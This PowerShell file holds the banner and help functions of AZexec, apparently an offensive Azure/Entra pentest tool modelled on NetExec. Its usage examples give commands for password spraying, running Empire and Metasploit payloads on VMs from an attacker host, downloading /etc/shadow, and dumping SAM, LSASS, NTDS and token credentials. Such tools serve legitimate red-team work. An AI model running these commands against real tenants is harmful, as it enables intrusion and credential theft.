# AZexec - UI Functions (Banner and Help)
# These functions are loaded into the main script scope via dot-sourcing
function Show-Banner {
    Write-Host ""
    
    $asciiArt = @"
 █████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔══██╗╚══███╔╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████║  ███╔╝ █████╗   ╚███╔╝ █████╗  ██║     
██╔══██║ ███╔╝  ██╔══╝   ██╔██╗ ██╔══╝  ██║     
██║  ██║███████╗███████╗██╔╝ ██╗███████╗╚██████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝
"@
    
    # Try to use colors if available (PowerShell supports ANSI by default on modern systems)
    try {
        # Check if ANSI escape sequences are supported
        if ($Host.UI.SupportsVirtualTerminal) {
            # ANSI color codes: Bright Magenta for ASCII art, Yellow for title
            $magenta = "`e[95m"
            $yellow = "`e[33m"
            $reset = "`e[0m"
            
            Write-Host "${magenta}${asciiArt}${reset}"
            Write-Host "${yellow}    The Azure Execution Tool${reset}"
        }
        else {
            # Fallback to PowerShell colors
            Write-Host $asciiArt -ForegroundColor Magenta
            Write-Host "    The Azure Execution Tool" -ForegroundColor Yellow
        }
    }
    catch {
        # Fallback without colors
        Write-Host $asciiArt
        Write-Host "    The Azure Execution Tool"
    }
    
    Write-Host "    https://logisek.com | info@logisek.com"
    Write-Host "    AZexec | github.com/Logisek/AZexec"
    Write-Host ""
    Write-Host ""
}

function Show-Help {
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Enumeration Tool - Available Commands`n" -Color "Yellow"
    
    $commands = @(
        @{Name="hosts"; Auth="Required"; Description="Enumerate devices from Azure/Entra ID (mimics nxc smb --hosts)"}
        @{Name="tenant"; Auth="Not Required"; Description="Discover tenant configuration and endpoints"}
        @{Name="users"; Auth="Not Required"; Description="Enumerate username existence (no authentication)"}
        @{Name="user-profiles"; Auth="Required"; Description="Enumerate user profiles with full details"}
        @{Name="rid-brute"; Auth="Required"; Description="Enumerate users by RID bruteforce (Azure equivalent, mimics nxc smb --rid-brute)"}
        @{Name="groups"; Auth="Required"; Description="Enumerate Azure Entra ID groups"}
        @{Name="pass-pol"; Auth="Required"; Description="Enumerate password policies and security defaults"}
        @{Name="guest"; Auth="Not Required"; Description="Test guest/external authentication (mimics nxc smb -u 'a' -p '')"}
        @{Name="spray"; Auth="Not Required"; Description="Password spray attack (mimics nxc smb -u users.txt -p 'Pass')"}
        @{Name="vuln-list"; Auth="Hybrid"; Description="Enumerate vulnerable targets (mimics nxc smb --gen-relay-list)"}
        @{Name="sessions"; Auth="Required"; Description="Enumerate active sessions (mimics nxc smb --qwinsta)"}
        @{Name="guest-vuln-scan"; Auth="Hybrid"; Description="Automated guest user vulnerability scanner"}
        @{Name="apps"; Auth="Required"; Description="Enumerate registered applications and service principals"}
        @{Name="sp-discovery"; Auth="Required"; Description="Discover service principals with permissions and roles"}
        @{Name="roles"; Auth="Required"; Description="Enumerate directory role assignments and privileged accounts"}
        @{Name="ca-policies"; Auth="Required"; Description="Review conditional access policies (member accounts only)"}
        @{Name="vm-loggedon"; Auth="Required"; Description="Enumerate logged-on users on Azure VMs (mimics nxc smb --logged-on-users)"}
        @{Name="storage-enum"; Auth="Required"; Description="Enumerate Azure Storage Accounts (multi-subscription)"}
        @{Name="keyvault-enum"; Auth="Required"; Description="Enumerate Azure Key Vaults (multi-subscription)"}
        @{Name="network-enum"; Auth="Required"; Description="Enumerate Azure Network resources (multi-subscription)"}
        @{Name="shares-enum"; Auth="Required"; Description="Enumerate Azure File Shares (mimics nxc smb --shares)"}
        @{Name="disks-enum"; Auth="Required"; Description="Enumerate Azure Managed Disks (mimics nxc smb --disks)"}
        @{Name="bitlocker-enum"; Auth="Required"; Description="Enumerate BitLocker encryption status on Windows VMs (mimics nxc smb -M bitlocker)"}
        @{Name="local-groups"; Auth="Required"; Description="Enumerate Azure AD Administrative Units (mimics nxc smb --local-group)"}
        @{Name="av-enum"; Auth="Required"; Description="Enumerate Anti-Virus & EDR products (mimics nxc smb -M enum_av)"}
        @{Name="process-enum"; Auth="Required"; Description="Enumerate remote processes on Azure VMs (mimics nxc smb --tasklist)"}
        @{Name="lockscreen-enum"; Auth="Required"; Description="Detect lockscreen backdoors on Azure VMs (mimics nxc smb -M lockscreendoors)"}
        @{Name="intune-enum"; Auth="Required"; Description="Enumerate Intune/Endpoint Manager configuration (mimics nxc smb -M sccm-recon6)"}
        @{Name="delegation-enum"; Auth="Required"; Description="Enumerate OAuth2 delegation/impersonation paths (mimics nxc smb --delegate)"}
        @{Name="exec"; Auth="Required"; Description="Execute remote commands on Azure VMs (mimics nxc smb -x/-X)"}
        @{Name="empire-exec"; Auth="Required"; Description="Execute Empire stager on Azure VMs (mimics nxc -M empire_exec)"}
        @{Name="met-inject"; Auth="Required"; Description="Inject Metasploit payload on Azure VMs (mimics nxc -M met_inject)"}
        @{Name="spider"; Auth="Required"; Description="Spider Azure Storage for sensitive files (mimics nxc smb --spider / spider_plus)"}
        @{Name="get-file"; Auth="Required"; Description="Download file from Azure target (mimics nxc smb --get-file)"}
        @{Name="put-file"; Auth="Required"; Description="Upload file to Azure target (mimics nxc smb --put-file)"}
        @{Name="creds"; Auth="Required"; Description="Extract credentials from Azure targets (mimics nxc smb --sam/--lsa/--ntds/-M lsassy/-M wam)"}
        @{Name="help"; Auth="N/A"; Description="Display this help message"}
    )
    
    Write-ColorOutput -Message "Command".PadRight(20) + "Auth".PadRight(15) + "Description" -Color "Cyan"
    Write-ColorOutput -Message ("-" * 80) -Color "DarkGray"
    
    foreach ($cmd in $commands) {
        $authColor = switch ($cmd.Auth) {
            "Required" { "Yellow" }
            "Not Required" { "Green" }
            "Hybrid" { "Cyan" }
            default { "White" }
        }
        
        Write-Host $cmd.Name.PadRight(20) -NoNewline
        if ($NoColor) {
            Write-Host $cmd.Auth.PadRight(15) -NoNewline
        } else {
            Write-Host $cmd.Auth.PadRight(15) -ForegroundColor $authColor -NoNewline
        }
        Write-Host $cmd.Description
    }
    
    Write-ColorOutput -Message "`n[*] Examples:" -Color "Yellow"
    Write-Host "    .\azx.ps1 hosts                          - Enumerate all devices"
    Write-Host "    .\azx.ps1 tenant -Domain example.com     - Discover tenant configuration"
    Write-Host "    .\azx.ps1 users -CommonUsernames         - Check common usernames"
    Write-Host "    .\azx.ps1 rid-brute -ExportPath users.csv - Enumerate users (RID brute equivalent)"
    Write-Host "    .\azx.ps1 groups -ExportPath groups.csv  - Export groups to CSV"
    Write-Host "    .\azx.ps1 bitlocker-enum                 - Enumerate BitLocker on Windows VMs"
    Write-Host "    .\azx.ps1 sp-discovery                   - Discover service principals"
    Write-Host "    .\azx.ps1 roles -ExportPath roles.json   - Export role assignments to JSON"
    Write-Host "    .\azx.ps1 ca-policies                    - Review conditional access policies"
    Write-Host "    .\azx.ps1 vm-loggedon -VMFilter running  - Enumerate logged-on users on running VMs"
    Write-Host "    .\azx.ps1 shares-enum                    - Enumerate Azure File Shares (--shares)"
    Write-Host "    .\azx.ps1 shares-enum -SharesFilter WRITE - Filter shares with WRITE access"
    Write-Host "    .\azx.ps1 av-enum                        - Enumerate AV/EDR products (-M enum_av)"
    Write-Host "    .\azx.ps1 av-enum -Filter noncompliant   - Find devices with security gaps"
    Write-Host "    .\azx.ps1 process-enum                   - Enumerate remote processes (--tasklist)"
    Write-Host "    .\azx.ps1 lockscreen-enum                - Detect lockscreen backdoors (-M lockscreendoors)"
    Write-Host "    .\azx.ps1 intune-enum                    - Enumerate Intune/Endpoint Manager (-M sccm-recon6)"
    Write-Host "    .\azx.ps1 delegation-enum                - Enumerate OAuth2 delegation (--delegate)"
    Write-Host "    .\azx.ps1 exec -VMName vm-01 -x 'whoami' - Execute shell command (-x)"
    Write-Host "    .\azx.ps1 exec -VMName vm-01 -x '\$env:COMPUTERNAME' -PowerShell - Execute PowerShell (-X)"

    Write-ColorOutput -Message "`n[*] Empire Execution Examples (NetExec -M empire_exec equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -VMName vm-01"
    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireConfigFile config.json -AllVMs"
    Write-Host "    .\azx.ps1 empire-exec -Listener http -EmpireHost empire.local -EmpireUsername admin -EmpirePassword pass -Obfuscate -AllVMs"

    Write-ColorOutput -Message "`n[*] Metasploit Injection Examples (NetExec -M met_inject equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -VMName vm-01"
    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 443 -RAND xyz789 -SSL -AllVMs"
    Write-Host "    .\azx.ps1 met-inject -SRVHOST 10.10.10.1 -SRVPORT 8080 -RAND abc123 -ProxyHost proxy.corp -ProxyPort 8080 -VMName vm-01"

    Write-ColorOutput -Message "`n[*] Spider Examples (NetExec --spider / spider_plus equivalent):" -Color "Yellow"
    Write-Host "    # Storage Spider (default - blobs and file shares)"
    Write-Host "    .\azx.ps1 spider                                           - Spider all storage accounts"
    Write-Host "    .\azx.ps1 spider -Pattern 'txt,docx,key,pem,pfx,config'    - Pattern filter"
    Write-Host "    .\azx.ps1 spider -Pattern 'pem,pfx,key' -Download -OutputFolder C:\Loot"
    Write-Host "    .\azx.ps1 spider -StorageAccountTarget 'mystorageacct' -BlobsOnly"
    Write-Host ""
    Write-Host "    # VM Spider (file systems on Azure VMs via exec)"
    Write-Host "    .\azx.ps1 spider -VMName 'vm-web-01' -Pattern 'key,pem,config'"
    Write-Host "    .\azx.ps1 spider -AllVMs -Pattern 'password,credential' -StartPath 'C:\Users'"
    Write-Host "    .\azx.ps1 spider -VMName 'vm-01' -Download -ExcludePaths 'Windows,Program Files'"
    Write-Host ""
    Write-Host "    # Device Spider (Arc-enabled servers)"
    Write-Host "    .\azx.ps1 spider -DeviceName 'arc-server-01' -Pattern 'key,pem'"
    Write-Host "    .\azx.ps1 spider -AllDevices -StartPath '/etc' -Pattern 'conf,key'"
    Write-Host "    .\azx.ps1 spider -DeviceName 'arc-srv' -Download -MaxFileSize 5"

    Write-ColorOutput -Message "`n[*] File Transfer Examples (NetExec --get-file/--put-file equivalent):" -Color "Yellow"
    Write-Host "    # Download files from targets"
    Write-Host "    .\azx.ps1 get-file -VMName 'vm-01' -RemotePath 'C:\Users\admin\secret.txt' -LocalPath '.\loot\secret.txt'"
    Write-Host "    .\azx.ps1 get-file -DeviceName 'arc-01' -RemotePath '/etc/shadow' -LocalPath '.\shadow'"
    Write-Host "    .\azx.ps1 get-file -StorageAccountTarget 'myaccount' -ContainerTarget 'data' -RemotePath 'creds.txt' -LocalPath '.\creds.txt'"
    Write-Host ""
    Write-Host "    # Upload files to targets"
    Write-Host "    .\azx.ps1 put-file -VMName 'vm-01' -LocalPath '.\payload.ps1' -RemotePath 'C:\Windows\Temp\payload.ps1'"
    Write-Host "    .\azx.ps1 put-file -DeviceName 'arc-01' -LocalPath '.\script.sh' -RemotePath '/tmp/script.sh'"
    Write-Host "    .\azx.ps1 put-file -StorageAccountTarget 'myaccount' -ContainerTarget 'uploads' -LocalPath '.\data.txt' -RemotePath 'folder/data.txt'"

    Write-ColorOutput -Message "`n[*] Password Spray Examples (NetExec-style):" -Color "Yellow"
    Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'"
    Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile pass.txt -Delay 1800"
    Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass' -ContinueOnSuccess"
    Write-Host "    .\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile pass.txt -NoBruteforce"

    Write-ColorOutput -Message "`n[*] Credential Check with Admin Detection (NetExec Pwn3d! equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Pass123'"
    Write-Host "    # Output: AZR contoso.com 443 admin@contoso.com [+] SUCCESS! Got access token (GlobalAdmin!)"
    Write-Host "    # Automatically detects privileged roles: GlobalAdmin!, SecurityAdmin!, UserAdmin!, etc."

    Write-ColorOutput -Message "`n[*] Token-Based Authentication (Pass-the-Hash equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 guest -AccessToken 'eyJ0eXAi...'    - Test stolen/extracted access token"
    Write-Host "    # Username extracted from token claims automatically"
    Write-Host "    # Checks for privileged roles and displays (GlobalAdmin!), etc."
    Write-Host "    # Token sources: Browser storage, memory dumps, token cache files"

    Write-ColorOutput -Message "`n[*] Credential Extraction Examples (NetExec --sam equivalent):" -Color "Yellow"
    Write-Host "    # SAM extraction (NetExec --sam equivalent)"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-web-01'                         - Extract all credentials (auto)"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-web-01' -CredMethod sam         - SAM hash extraction only"
    Write-Host "    .\azx.ps1 creds -AllVMs -ResourceGroup 'Production-RG'     - Extract from all VMs in RG"
    Write-Host ""
    Write-Host "    # Managed Identity token extraction (Azure-specific)"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-web-01' -CredMethod tokens      - Extract MI tokens"
    Write-Host "    .\azx.ps1 creds -AllVMs -CredMethod tokens                  - Tokens from all VMs"
    Write-Host ""
    Write-Host "    # DPAPI secrets (browser creds, credential manager, WiFi)"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-web-01' -CredMethod dpapi       - Extract DPAPI secrets"
    Write-Host ""
    Write-Host "    # Arc devices"
    Write-Host "    .\azx.ps1 creds -DeviceName 'arc-server-01'                 - Extract from Arc device"
    Write-Host "    .\azx.ps1 creds -AllDevices -CredMethod sam                 - SAM from all Arc devices"
    Write-Host ""
    Write-Host "    # Export for cracking"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -HashcatFormat -ExportPath hashes.txt"
    Write-Host "    .\azx.ps1 creds -AllVMs -ExportPath results.json"

    Write-ColorOutput -Message "`n[*] LSA Secrets Examples (NetExec --lsa equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod lsa              - Extract LSA secrets"
    Write-Host "    .\azx.ps1 creds -AllVMs -CredMethod lsa -ExportPath lsa.json  - LSA secrets from all VMs"

    Write-ColorOutput -Message "`n[*] NTDS.dit Dump Examples (NetExec --ntds equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds                          - NTDS dump (VSS, default)"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds -NTDSMethod ntdsutil     - NTDS via ntdsutil IFM"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds -NTDSMethod drsuapi      - DCSync via DSInternals"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds -EnabledOnly              - Only enabled accounts"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod ntds -TargetDomainUser admin   - Specific user"

    Write-ColorOutput -Message "`n[*] LSASS Dump Examples (NetExec -M lsassy equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod lsass                         - LSASS dump (comsvcs, default)"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod lsass -LsassMethod procdump   - Via procdump"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod lsass -LsassMethod direct     - Via P/Invoke MiniDumpWriteDump"

    Write-ColorOutput -Message "`n[*] Backup Operator Examples (NetExec -M backup_operator equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'dc-01' -CredMethod backup            - Extract via SeBackupPrivilege"

    Write-ColorOutput -Message "`n[*] SCCM/Intune Examples (NetExec --sccm equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod sccm              - Search filesystem for secrets"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod sccm -SCCMMethod api  - Enumerate Intune via Graph API"

    Write-ColorOutput -Message "`n[*] WAM Token Broker Examples (NetExec -M wam equivalent):" -Color "Yellow"
    Write-Host "    .\azx.ps1 creds -VMName 'vm-01' -CredMethod wam               - Extract WAM/AAD broker tokens"
    Write-Host "    .\azx.ps1 creds -AllVMs -CredMethod wam -ExportPath wam.json   - WAM tokens from all VMs"

    Write-ColorOutput -Message "`n[*] For detailed help and more examples, see README.md or use Get-Help .\azx.ps1" -Color "Cyan"
    Write-Host ""
}

